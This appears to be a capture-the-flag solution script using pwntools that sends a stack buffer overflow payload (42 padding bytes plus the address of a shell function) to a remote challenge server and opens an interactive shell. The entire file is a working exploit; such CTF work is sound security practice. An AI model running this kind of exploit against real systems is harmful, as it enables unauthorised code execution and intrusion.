#!/usr/bin/python3

from pwn import *

p = remote("pnw.linux.ctf.shellmates.club", 1503)

offset = 42 #we got offset using cyclic
secret_adress = p32(0x080491d6) # the adress of the shell function
payload = b"A"*offset + secret_adress # overwrite the return adress pointer

p.sendline(payload)
p.interactive()
p.close()